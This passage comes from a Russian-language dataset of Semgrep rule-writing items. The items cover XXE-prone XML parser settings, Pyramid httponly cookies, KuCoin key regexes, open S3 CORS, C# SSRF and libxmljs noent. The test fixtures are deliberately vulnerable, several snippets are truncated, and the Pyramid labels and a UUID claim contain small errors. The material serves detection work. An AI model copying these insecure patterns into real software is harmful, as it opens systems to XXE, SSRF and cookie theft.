    "input": "Требования:\n- Язык: java\n- Тип анализа: search\n- CWE: CWE-611: Improper Restriction of XML External Entity Reference\n- Серьезность: ERROR\n\nКонтекст кода:\n// File: documentbuilderfactory-external-general-entities-true.java\npackage example;\n\nimport javax.xml.parsers.DocumentBuilderFactory;\nimport javax.xml.parsers.DocumentBuilder;\nimport javax.xml.parsers.ParserConfigurationException;\n\n\nclass GoodDocumentBuilderFactory {\n    public void GoodXMLInputFactory() throws  ParserConfigurationException {\n        DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();\n        //ok:documentbuilderfactory-external-general-entities-true\n        dbf.setFeature(\"http://xml.org/sax/features/external-general-entities\" , false);\n    }\n}\n\nclass BadDocumentBuilderFactory{\n    public void BadXMLInputFactory() throws  ParserConfigurationException {\n        DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();\n        //ruleid:documentbuilderfactory-external-general-entities-true\n        dbf.setFeature(\"http://xml.org/sax/features/external-general-entities\" , true);\n    }\n}\n\nclass GoodSAXParserFactory {\n    public void GoodSAXParserFactory() throws  ParserConfigurationException {\n        SAXParserFactory spf = SAXParserFactory.newInstance();\n        //ok:documentbuilderfactory-external-general-entities-true\n        spf.setFeature(\"http://xml.org/sax/features/external-general-entities\" , false);\n    }\n}\n\nclass BadSAXParserFactory{\n    public void BadSAXParserFactory() throws  ParserConfigurationException {\n        SAXParserFactory spf = SAXParserFactory.newInstance();\n        //ruleid:documentbuilderfactory-external-general-entities-true\n        spf.setFeature(\"http://xml.org/sax/features/external-general-entities\" , true);\n    }\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• dbf.setFeature(\"http://xml.org/sax/features/external-general-entities\", true);\n• spf.setFeature(\"http://xml.org/sax/features/external-general-entities\", true);\n\nБезопасные паттерны:  \n• dbf.setFeature(\"http://xml.org/sax/features/external-general-entities\", false);\n• spf.setFeature(\"http://xml.org/sax/features/external-general-entities\", false);\n\nЛегенда аннотаций:\n- // ruleid:documentbuilderfactory-external-general-entities-true: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:documentbuilderfactory-external-general-entities-true: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: documentbuilderfactory-external-general-entities-true\n  severity: ERROR\n  metadata:\n    cwe:\n    - 'CWE-611: Improper Restriction of XML External Entity Reference'\n    owasp:\n    - A04:2017 - XML External Entities (XXE)\n    - A05:2021 - Security Misconfiguration\n    asvs:\n      section: V5 Validation, Sanitization and Encoding\n      control_id: 5.5.2 Insecue XML Deserialization\n      control_url: https://github.com/OWASP/ASVS/blob/master/4.0/en/0x13-V5-Validation-Sanitization-Encoding.md#v55-deserialization-prevention\n      version: '4'\n    references:\n    - https://semgrep.dev/blog/2022/xml-security-in-java\n    - https://semgrep.dev/docs/cheat-sheets/java-xxe/\n    - https://blog.sonarsource.com/secure-xml-processor\n    category: security\n    technology:\n    - java\n    - xml\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - vuln\n    likelihood: LOW\n    impact: HIGH\n    confidence: HIGH\n  message: >-\n    External entities are allowed for $DBFACTORY.\n    This is vulnerable to XML external entity attacks. Disable this by setting the feature \"http://xml.org/sax/features/external-general-entities\"\n    to false.\n  pattern: $DBFACTORY.setFeature(\"http://xml.org/sax/features/external-general-entities\", true);\n  fix: $DBFACTORY.setFeature(\"http://xml.org/sax/features/external-general-entities\", false);\n  languages:\n  - java\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования DocumentBuilderFactory или SAXParserFactory с включенной опцией 'http://xml.org/sax/features/external-general-entities', что позволяет внешние общие сущности XML. Это уязвимо для атак XXE (XML External Entity). Правило ищет вызов метода setFeature с аргументом true для указанной опции, что указывает на разрешенные внешние общие сущности.\n\n# Ключевые элементы:\n- ID: documentbuilderfactory-external-general-entities-true\n- Язык: java \n- Тип: vuln\n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "documentbuilderfactory-external-general-entities-true",
      "language": "java",
      "severity": "ERROR",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения pyramid-set-cookie-httponly-unsafe-value\nОписание уязвимости: Found a Pyramid cookie without the httponly option correctly set. Pyramid cookies should be handled securely by setting httponly=True in response.set_cookie(...). If this parameter is not properly set, your cookies are not properly protected and are at risk of being stolen by an attacker.\nCWE: CWE-1004: Sensitive Cookie Without 'HttpOnly' Flag\nТип анализа: search\nЯзык: python",
    "input": "Требования:\n- Язык: python\n- Тип анализа: search\n- CWE: CWE-1004: Sensitive Cookie Without 'HttpOnly' Flag\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: set-cookie-httponly-unsafe-value.fixed.py\nfrom pyramid import httpexceptions as exc\nfrom pyramid.view import view_config\n\n### True positives ###\n\n\n@view_config(route_name='my_view')\ndef my_bad_view1(request):\n    response = request.response\n    response.set_cookie('MY_COOKIE', value='MY_COOKIE_VALUE',\n                        # ruleid: pyramid-set-cookie-httponly-unsafe-value\n                        httponly=True, secure=True)\n    return {'foo': 'bar'}\n\n\n@view_config(route_name='my_view')\ndef my_bad_view3(request):\n    resp = exc.HTTPFound(location=request.referer or request.application_url)\n    resp.set_cookie('MY_COOKIE', value='MY_COOKIE_VALUE',\n                    # ruleid: pyramid-set-cookie-httponly-unsafe-value\n                    secure=True, httponly=True)\n    return resp\n\n\n### True negatives ###\n\n@view_config(route_name='my_view')\ndef my_good_view1(request):\n    response = request.response\n    # ok: pyramid-set-cookie-httponly-unsafe-value\n    response.set_cookie('MY_COOKIE', value='MY_COOKIE_VALUE',\n                        secure=True, httponly=True)\n    return {'foo': 'bar'}\n\n\n@view_config(route_name='my_view')\ndef my_good_view2(request):\n    resp = exc.HTTPFound(location=request.referer or request.application_url)\n    # ok: pyramid-set-cookie-httponly-unsafe-value\n    resp.set_cookie('MY_COOKIE', secure=True,\n                    httponly=True, value='MY_COOKIE_VALUE')\n    return resp\n\n\n@view_config(route_name='my_view')\ndef my_good_view3(request):\n    resp = exc.HTTPFound(location=request.referer or request.application_url)\n    # ok: pyramid-set-cookie-httponly-unsafe-value\n    resp.set_cookie('MY_COOKIE', value='MY_COOKIE_VALUE',\n                    **global_cookie_flags)\n    return resp\n\n\n// File: set-cookie-httponly-unsafe-value.py\nfrom pyramid import httpexceptions as exc\nfrom pyramid.view import view_config\n\n### True positives ###\n\n\n@view_config(route_name='my_view')\ndef my_bad_view1(request):\n    response = request.response\n    response.se  # Ограничиваем длину\n\nОпасные паттерны:\n• @view_config(route_name='my_view')\ndef my_bad_view1(request):\n    response = request.response\n    response.set_cookie('MY_COOKIE', value='MY_COOKIE_VALUE', \n                        # ruleid: pyramid-s\n• @view_config(route_name='my_view')\ndef my_bad_view3(request):\n    resp = exc.HTTPFound(location=request.referer or request.application_url)\n    resp.set_cookie('MY_COOKIE', value='MY_COOKIE_VALUE', \n \n\nБезопасные паттерны:  \n• @view_config(route_name='my_view')\ndef my_good_view1(request):\n    response = request.response\n    # ok: pyramid-set-cookie-httponly-unsafe-value\n    response.set_cookie('MY_COOKIE', value='MY_COOKIE_\n• @view_config(route_name='my_view')\ndef my_good_view2(request):\n    resp = exc.HTTPFound(location=request.referer or request.application_url)\n    # ok: pyramid-set-cookie-httponly-unsafe-value\n    resp\n\nЛегенда аннотаций:\n- // ruleid:pyramid-set-cookie-httponly-unsafe-value: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:pyramid-set-cookie-httponly-unsafe-value: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: pyramid-set-cookie-httponly-unsafe-value\n  patterns:\n  - pattern-either:\n    - pattern-inside: |\n        @pyramid.view.view_config(...)\n        def $VIEW($REQUEST):\n            ...\n            $RESPONSE = $REQUEST.response\n            ...\n    - pattern-inside: |\n        def $VIEW(...):\n            ...\n            $RESPONSE = pyramid.httpexceptions.HTTPFound(...)\n            ...\n  - pattern-not: $RESPONSE.set_cookie(..., **$PARAMS)\n  - pattern: $RESPONSE.set_cookie(..., httponly=$HTTPONLY, ...)\n  - pattern: $HTTPONLY\n  - metavariable-pattern:\n      metavariable: $HTTPONLY\n      pattern: |\n        False\n  fix: |\n    True\n  message: >-\n    Found a Pyramid cookie without the httponly option correctly set.\n    Pyramid cookies should be handled securely by setting httponly=True in response.set_cookie(...).\n    If this parameter is not properly set, your cookies are not properly protected and\n    are at risk of being stolen by an attacker.\n  metadata:\n    cwe:\n    - \"CWE-1004: Sensitive Cookie Without 'HttpOnly' Flag\"\n    owasp:\n    - A05:2021 - Security Misconfiguration\n    references:\n    - https://owasp.org/www-community/controls/SecureCookieAttribute\n    - https://owasp.org/www-community/HttpOnly\n    - https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html#httponly-attribute\n    category: security\n    technology:\n    - pyramid\n    subcategory:\n    - vuln\n    likelihood: LOW\n    impact: LOW\n    confidence: MEDIUM\n  languages: [python]\n  severity: WARNING\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска случаев, когда при установке куки в Pyramid фреймворке не установлен флаг httponly. Анализ выполняется путем поиска функции set_cookie в объекте response или HTTPFound, после чего проверяется наличие параметра httponly и его значение. Если параметр отсутствует или имеет значение False, правило отмечает этот случай как потенциально небезопасный. Правило также учитывает случаи, когда кука устанавливается через словарь параметров (**params), исключая их из проверки.\n\n# Ключевые элементы:\n- ID: pyramid-set-cookie-httponly-unsafe-value\n- Язык: python \n- Тип: vuln\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "pyramid-set-cookie-httponly-unsafe-value",
      "language": "python",
      "severity": "WARNING",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения kucoin-secret-key\nОписание уязвимости: A gitleaks kucoin-secret-key was detected which attempts to identify hard-coded credentials. It is not recommended to store credentials in source-code, as this risks secrets being leaked and used by either an internal or external malicious adversary. It is recommended to use environment variables to securely provide credentials or retrieve credentials from a secure vault or HSM (Hardware Security Module).\nCWE: CWE-798: Use of Hard-coded Credentials\nТип анализа: search\nЯзык: regex",
    "input": "Требования:\n- Язык: regex\n- Тип анализа: search\n- CWE: CWE-798: Use of Hard-coded Credentials\n- Серьезность: INFO\n\nКонтекст кода:\n// File: kucoin-secret-key.go\n// ruleid: kucoin-secret-key\nkucoin_api_token = \"afefcb86-9bcf-f05e-6e34-14bd72a32efe\"  # Ограничиваем длину\n\nОпасные паттерны:\n• // ruleid: kucoin-secret-key\nkucoin_api_token = \"afefcb86-9bcf-f05e-6e34-14bd72a32efe\"\n• // ruleid: kucoin-secret-key\nconst kucoinSecretKey = 'f97c3790-3790-4f90-a090-379037903790'\n• // ruleid: kucoin-secret-key\nlet kucoinApiToken = '00000000-0000-0000-0000-000000000000'\n\nБезопасные паттерны:  \n• import os\nkucoin_api_token = os.environ.get('KUCOIN_API_TOKEN')\n• kucoin_secret_key = get_credential_from_secure_vault('kucoin')\n• const kucoinToken = fetchCredentialFromHsm('kucoin')\n\nЛегенда аннотаций:\n- // ruleid:kucoin-secret-key: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:kucoin-secret-key: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: kucoin-secret-key\n  message: A gitleaks kucoin-secret-key was detected which attempts to identify hard-coded credentials. It is not recommended to store credentials in source-code, as this risks secrets being leaked and used by either an internal or external malicious adversary. It is recommended to use environment variables to securely provide credentials or retrieve credentials from a secure vault or HSM (Hardware Security Module).\n  languages:\n    - regex\n  severity: INFO\n  metadata:\n      likelihood: LOW\n      impact: MEDIUM\n      confidence: LOW\n      category: security\n      cwe:\n        - \"CWE-798: Use of Hard-coded Credentials\"\n      cwe2021-top25: true\n      cwe2022-top25: true\n      owasp:\n        - A07:2021 - Identification and Authentication Failures\n      references:\n        - https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html\n      source-rule-url: https://github.com/zricethezav/gitleaks/tree/master/cmd/generate/config/rules\n      subcategory:\n        - vuln\n      technology:\n        - gitleaks\n  patterns:\n    - pattern-regex: (?i)(?:kucoin)(?:[0-9a-z\\-_\\t .]{0,20})(?:[\\s|']|[\\s|\"]){0,3}(?:=|>|:{1,3}=|\\|\\|:|<=|=>|:|\\?=)(?:'|\\\"|\\s|=|\\x60){0,5}([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})(?:['|\\\"|\\n|\\r|\\s|\\x60|;]|$)\n\n\n# Логика правила:\nЭто правило Semgrep использует регулярное выражение для поиска жестко закодированных секретных ключей Kucoin API. Оно ищет строку 'kucoin' в сочетании с UUID формата версии 4 (например, 'afefcb86-9bcf-f05e-6e34-14bd72a32efe'), которая может быть использована для идентификации учетной записи Kucoin. Правило применяет нечувствительность к регистру ('(?i)') и допускает переменное количество пробелов, табуляций и специальных символов вокруг идентификатора UUID.\n\n# Ключевые элементы:\n- ID: kucoin-secret-key\n- Язык: regex \n- Тип: vuln\n- Серьезность: INFO",
    "metadata": {
      "rule_id": "kucoin-secret-key",
      "language": "regex",
      "severity": "INFO",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Напиши Semgrep правило для обнаружения: all-origins-allowed\nОписание уязвимости: CORS rule on bucket permits any origin\nCWE: CWE-942: Permissive Cross-domain Policy with Untrusted Domains\nТип анализа: search\nЯзык: hcl",
    "input": "Требования:\n- Язык: hcl\n- Тип анализа: search\n- CWE: CWE-942: Permissive Cross-domain Policy with Untrusted Domains\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: s3-cors-all-origins.tf\nresource \"aws_s3_bucket\" \"a\" {\n  bucket = \"s3-website-test.hashicorp.com\"\n  acl    = \"private\"\n\n  cors_rule {\n    allowed_headers = [\"*\"]\n    allowed_methods = [\"PUT\", \"POST\"]\n    # ok: all-origins-allowed\n    allowed_origins = [\"https://s3-website-test.hashicorp.com\"]\n    expose_headers  = [\"ETag\"]\n    max_age_seconds = 3000\n  }\n}\n\nresource \"aws_s3_bucket\" \"b\" {\n  bucket = \"s3-website-test-open.hashicorp.com\"\n  acl    = \"private\"\n\n  cors_rule {\n    allowed_headers = [\"*\"]\n    allowed_methods = [\"PUT\", \"POST\"]\n    # ruleid: all-origins-allowed\n    allowed_origins = [\"*\"]\n    expose_headers  = [\"ETag\"]\n    max_age_seconds = 3000\n  }\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• cors_rule { ... } allowed_origins = [\"*\"]\n• cors_rule { ... } allowed_origins = ['*']\n\nБезопасные паттерны:  \n• cors_rule { ... } allowed_origins = [\"https://example.com\"]\n• cors_rule { ... } allowed_origins = [\"http://example.com\", \"https://example.net\"]\n\nЛегенда аннотаций:\n- // ruleid:all-origins-allowed: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:all-origins-allowed: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: all-origins-allowed\n  patterns:\n  - pattern-inside: cors_rule { ... }\n  - pattern: allowed_origins = [\"*\"]\n  languages:\n  - hcl\n  severity: WARNING\n  message: CORS rule on bucket permits any origin\n  metadata:\n    references:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/s3_bucket#using-cors\n    cwe:\n    - 'CWE-942: Permissive Cross-domain Policy with Untrusted Domains'\n    category: security\n    technology:\n    - terraform\n    - aws\n    owasp:\n    - A05:2021 - Security Misconfiguration\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: LOW\n    confidence: LOW\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска конфигураций AWS S3 buckets, которые разрешают доступ ко всем origins ('*') через заголовок CORS allowed_origins. Паттерн сначала ищет блок cors_rule внутри ресурса aws_s3_bucket, затем проверяет, установлено ли значение allowed_origins равным ['*'], что указывает на потенциально небезопасную конфигурацию.\n\n# Ключевые элементы:\n- ID: all-origins-allowed\n- Язык: hcl \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "all-origins-allowed",
      "language": "hcl",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения ssrf\nОписание уязвимости: The web server receives a URL or similar request from an upstream component and retrieves the contents of this URL, but it does not sufficiently ensure that the request is being sent to the expected destination. Many different options exist to fix this issue depending the use case (Application can send request only to identified and trusted applications, Application can send requests to ANY external IP address or domain name).\nCWE: CWE-918: Server-Side Request Forgery (SSRF)\nТип анализа: search\nЯзык: csharp",
    "input": "Требования:\n- Язык: csharp\n- Тип анализа: search\n- CWE: CWE-918: Server-Side Request Forgery (SSRF)\n- Серьезность: ERROR\n\nКонтекст кода:\n// File: web-request.cs\nusing System.Net.WebRequest;\nusing System.Uri;\n\nnamespace Ssrf\n{\n    public class Ssrf\n    {\n        #region Pattern 1\n        // ruleid: ssrf\n        public void WebRequest(string host)\n        {\n            try\n            {\n                WebRequest webRequest = WebRequest.Create(host);;\n            }\n            catch (Exception e)\n            {\n                System.Diagnostics.Debug.WriteLine(e);\n            }\n        }\n\n        // ok: ssrf\n        public void WebRequest(string host)\n        {\n            try\n            {\n                WebRequest webRequest = WebRequest.Create(\"constant\");;\n            }\n            catch (Exception e)\n            {\n                System.Diagnostics.Debug.WriteLine(e);\n            }\n        }\n\n        #endregion\n\n        #region Pattern 2\n\n        // ruleid: ssrf\n        public void WebRequestWithStringConcatenation(string host)\n        {\n\n            String baseUrl = \"constant\" + host;\n\n            WebRequest webRequest = WebRequest.Create(baseUrl);\n        }\n\n        // ok: ssrf\n        public void WebRequestWithStringConcatenation(string host)\n        {\n            String baseUrl = \"constant\";\n            WebRequest webRequest = WebRequest.Create(baseUrl);\n        }\n\n        // ruleid: ssrf\n        public void WebRequestWithUri(string host)\n        {\n            Uri uri = new Uri(host);\n            WebRequest webRequest = WebRequest.Create(uri);\n        }\n\n        // ok: ssrf\n        public void ssrf5(string host)\n        {\n            Uri uri = new Uri(\"constant\");\n            WebRequest webRequest = WebRequest.Create(uri);\n        }\n\n        #endregion\n\n        #region Pattern 3\n\n        // ruleid: ssrf\n        public void WebRequestStringToUri(string host)\n        {\n\n            String baseUrl = \"constant\" + host;\n            Uri uri = new Uri(baseUrl);\n\n            WebRequest webRequest = WebRequest.Create(uri);\n        }\n\n        // ok: ssrf\n        public void WebRequestStringToUri(string  # Ограничиваем длину\n\nОпасные паттерны:\n• // File: web-request.cs\nusing System.Net;\n...\npublic void WebRequest(string host)\n{\n    try\n    {\n        WebRequest webRequest = WebRequest.Create(host);\n    }\n    catch (Exception e)\n    {\n        S\n• // File: web-request.cs\nusing System.Net;\n...\npublic void WebRequestWithStringConcatenation(string host)\n{\n    String baseUrl = \"constant\" + host;\n    WebRequest webRequest = WebRequest.Create(baseUrl\n• // File: web-request.cs\nusing System.Net;\n...\npublic void WebRequestWithUri(string host)\n{\n    Uri uri = new Uri(host);\n    WebRequest webRequest = WebRequest.Create(uri);\n}\n\nБезопасные паттерны:  \n• // File: web-request.cs\nusing System.Net;\n...\npublic void WebRequest(string host)\n{\n    try\n    {\n        WebRequest webRequest = WebRequest.Create(\"constant\");\n    }\n    catch (Exception e)\n    {\n   \n• // File: web-request.cs\nusing System.Net;\n...\npublic void WebRequestWithStringConcatenation(string host)\n{\n    String baseUrl = \"constant\";\n    WebRequest webRequest = WebRequest.Create(baseUrl);\n}\n• // File: web-request.cs\nusing System.Net;\n...\npublic void WebRequestWithUri(string host)\n{\n    Uri uri = new Uri(\"constant\");\n    WebRequest webRequest = WebRequest.Create(uri);\n}\n\nЛегенда аннотаций:\n- // ruleid:ssrf: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:ssrf: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: ssrf\n  severity: ERROR\n  languages:\n  - csharp\n  metadata:\n    cwe:\n    - 'CWE-918: Server-Side Request Forgery (SSRF)'\n    owasp:\n    - A10:2021 - Server-Side Request Forgery (SSRF)\n    references:\n    - https://cwe.mitre.org/data/definitions/918.html\n    - https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html\n    category: security\n    technology:\n    - .net\n    confidence: LOW\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: MEDIUM\n  message: >-\n    The web server receives a URL or similar request from an upstream component and retrieves the contents\n    of this URL, but\n    it does not sufficiently ensure that the request is being sent to the expected destination.\n    Many different options exist to fix this issue depending the use case (Application can send request\n    only to identified\n    and trusted applications, Application can send requests to ANY external IP address or domain name).\n  patterns:\n  - pattern-inside: |\n      using System.Net;\n      ...\n  - pattern-either:\n    - pattern: |\n        $T $F(..., $X, ...)\n        {\n        ...\n        ... WebRequest.Create(<... $X ...>);\n        }\n    - pattern: |\n        $T $F($X)\n        {\n        ...\n        $A $B = <... $X ...>;\n        ...\n        ... WebRequest.Create($B);\n        }\n    - pattern: |\n        $T $F($X)\n        {\n        ...\n        $A $B = <... $X ...>;\n        ...\n        $C $D = <... $B ...>;\n        ...\n        ... WebRequest.Create($D);\n        }\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска потенциальных уязвимостей SSRF (Server Side Request Forgery) в коде на языке C#. Анализируется создание объекта класса WebRequest через метод Create(), где аргумент передается извне или формируется динамически из входных данных. Правило использует шаблонный подход, проверяя наличие вызова метода Create() внутри блока, содержащего переменную, значение которой может быть изменено пользователем или получено из внешнего источника.\n\n# Ключевые элементы:\n- ID: ssrf\n- Язык: csharp \n- Тип: audit\n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "ssrf",
      "language": "csharp",
      "severity": "ERROR",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Напиши правило Semgrep для: deprecated-pervasives\nОписание уязвимости: Pervasives is deprecated and will not be available after 4.10. Use Stdlib.\nCWE: \nТип анализа: search\nЯзык: ocaml",
    "input": "Требования:\n- Язык: ocaml\n- Тип анализа: search\n- CWE: \n- Серьезность: ERROR\n\nКонтекст кода:\n// File: deprecated.ml\nlet test1 () =\n  (* ruleid:deprecated-pervasives *)\n  let x = Pervasives.compare in\n  x 1 2  # Ограничиваем длину\n\nОпасные паттерны:\n• let x = Pervasives.compare in x 1 2\n• let y = Pervasives.open_in in y \"file.txt\"\n• let z = Pervasives.close_out in z my_channel\n\nБезопасные паттерны:  \n• let compare = Stdlib.compare in compare 1 2\n• let open_in = Stdlib.open_in in open_in \"file.txt\"\n• let close_out = Stdlib.close_out in close_out my_channel\n\nЛегенда аннотаций:\n- // ruleid:deprecated-pervasives: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:deprecated-pervasives: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n  - id: deprecated-pervasives\n    pattern: Pervasives.$X\n    message: Pervasives is deprecated and will not be available after 4.10. Use Stdlib.\n    languages: [ocaml]\n    severity: ERROR\n    metadata:\n      category: compatibility\n      technology:\n        - ocaml\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования устаревших идентификаторов из модуля Pervasives в языке OCaml. Модуль Pervasives является стандартным модулем, содержащим базовые функции языка, но он был помечен как устаревший и больше не будет доступен в будущих версиях. Правило использует шаблон 'Pervasives.$X', где $X представляет любую переменную или функцию из этого модуля, для выявления таких устаревших вызовов.\n\n# Ключевые элементы:\n- ID: deprecated-pervasives\n- Язык: ocaml \n- Тип: \n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "deprecated-pervasives",
      "language": "ocaml",
      "severity": "ERROR",
      "rule_type": "",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения express-libxml-noent\nОписание уязвимости: The libxml library processes user-input with the `noent` attribute is set to `true` which can lead to being vulnerable to XML External Entities (XXE) type attacks. It is recommended to set `noent` to `false` when using this feature to ensure you are protected.\nCWE: CWE-611: Improper Restriction of XML External Entity Reference\nТип анализа: taint\nЯзык: javascript\nИсточники (sources): определены в правиле\nСинки (sinks): определены в правиле",
    "input": "Требования:\n- Язык: javascript\n- Тип анализа: taint\n- CWE: CWE-611: Improper Restriction of XML External Entity Reference\n- Серьезность: ERROR\n\nКонтекст кода:\n// File: express-libxml-noent.js\nvar libxmljs = require(\"libxmljs\");\nvar libxmljs2 = require(\"libxmljs2\");\n\nmodule.exports.foo =  function(req, res) {\n\n\t// ruleid: express-libxml-noent\n\tlibxmljs.parseXmlString(req.files.products.data.toString('utf8'), {noent:true,noblanks:true})\n\t// ruleid: express-libxml-noent\n\tlibxmljs.parseXml(req.query.products, {noent:true,noblanks:true})\n\t// ok: express-libxml-noent\n\tlibxmljs.parseXml(req.files.products.data.toString('utf8'), {noent:false,noblanks:true})\n\t// ruleid: express-libxml-noent\n\tlibxmljs2.parseXmlString(req.body, {noent:true,noblanks:true})\n\t// ruleid: express-libxml-noent\n\tlibxmljs2.parseXml(req.body, {noent:true,noblanks:true})\n\t// ok: express-libxml-noent\n\tlibxmljs2.parseXml(req.body, {noent:false,noblanks:true})\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• libxmljs.parseXmlString(req.files.products.data.toString('utf8'), {noent:true,noblanks:true})\n• libxmljs.parseXml(req.query.products, {noent:true,noblanks:true})\n• libxmljs2.parseXmlString(req.body, {noent:true,noblanks:true})\n\nБезопасные паттерны:  \n• libxmljs.parseXml(req.files.products.data.toString('utf8'), {noent:false,noblanks:true})\n• libxmljs2.parseXml(req.body, {noent:false,noblanks:true})\n\nЛегенда аннотаций:\n- // ruleid:express-libxml-noent: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:express-libxml-noent: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: express-libxml-noent\n  message: >-\n    The libxml library processes user-input with the `noent` attribute is\n    set to `true` which can lead to being vulnerable to XML External Entities\n    (XXE) type attacks. It is recommended to set `noent` to `false` when using\n    this feature to ensure you are protected.\n  options:\n    interfile: true\n  metadata:\n    interfile: true\n    references:\n    - https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html\n    technology:\n    - express\n    category: security\n    cwe:\n    - 'CWE-611: Improper Restriction of XML External Entity Reference'\n    owasp:\n    - A04:2017 - XML External Entities (XXE)\n    - A05:2021 - Security Misconfiguration\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - vuln\n    likelihood: HIGH\n    impact: HIGH\n    confidence: HIGH\n  languages:\n  - javascript\n  - typescript\n  severity: ERROR\n  mode: taint\n  pattern-sources:\n  - patterns:\n    - pattern-either:\n      - pattern-inside: function ... ($REQ, $RES) {...}\n      - pattern-inside: function ... ($REQ, $RES, $NEXT) {...}\n      - patterns:\n        - pattern-either:\n          - pattern-inside: $APP.$METHOD(..., function $FUNC($REQ, $RES) {...})\n          - pattern-inside: $APP.$METHOD(..., function $FUNC($REQ, $RES, $NEXT) {...})\n        - metavariable-regex:\n            metavariable: $METHOD\n            regex: ^(get|post|put|head|delete|options)$\n    - pattern-either:\n      - pattern: $REQ.query\n      - pattern: $REQ.body\n      - pattern: $REQ.params\n      - pattern: $REQ.cookies\n      - pattern: $REQ.headers\n      - pattern: $REQ.files.$ANYTHING.data.toString('utf8')\n      - pattern: $REQ.files.$ANYTHING['data'].toString('utf8')\n  - patterns:\n    - pattern-either:\n      - pattern-inside: |\n          ({ $REQ }: Request,$RES: Response, $NEXT: NextFunction) =>\n          {...}\n      - pattern-inside: |\n          ({ $REQ }: Request,$RES: Response) => {...}\n    - focus-metavariable: $REQ\n    - pattern-either:\n      - pattern: params\n      - pattern: query\n      - pattern: cookies\n      - pattern: headers\n      - pattern: body\n      - pattern: files.$ANYTHING.data.toString('utf8')\n      - pattern: files.$ANYTHING['data'].toString('utf8')\n  pattern-sinks:\n  - pattern-either:\n    - patterns:\n      - pattern-either:\n        - pattern-inside: |\n            $XML = require('$IMPORT')\n            ...\n        - pattern-inside: |\n            import $XML from '$IMPORT'\n              ...\n        - pattern-inside: |\n            import * as $XML from '$IMPORT'\n            ...\n      - metavariable-regex:\n          metavariable: $IMPORT\n          regex: ^(libxmljs|libxmljs2)$\n      - pattern-inside: $XML.$FUNC($QUERY, {...,noent:true,...})\n      - metavariable-regex:\n          metavariable: $FUNC\n          regex: ^(parseXmlString|parseXml)$\n      - focus-metavariable: $QUERY\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования библиотеки libxmljs или libxmljs2 в Express.js приложениях, где атрибут noent установлен в true при обработке пользовательского ввода. Это может привести к уязвимостям XXE (XML External Entity). Правило ищет функции parseXmlString и parseXml в контексте запросов (query, body, params, cookies, headers, файлы), которые передаются в библиотеку libxmljs/libxmljs2 с установленным параметром noent. Безопасным считается случай, когда параметр noent явно установлен в false.\n\n# Ключевые элементы:\n- ID: express-libxml-noent\n- Язык: javascript \n- Тип: vuln\n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "express-libxml-noent",
      "language": "javascript",
      "severity": "ERROR",
      "rule_type": "vuln",
      "mode": "taint",
      "is_validation": true
    }
  },
  {
    "instruction": "Напиши правило Semgrep для: azure-appservice-auth\nОписание уязвимости: Ensure App Service Authentication is set on Azure App Service\nCWE: CWE-1220: Insufficient Granularity of Access Control\nТип анализа: search\nЯзык: hcl",
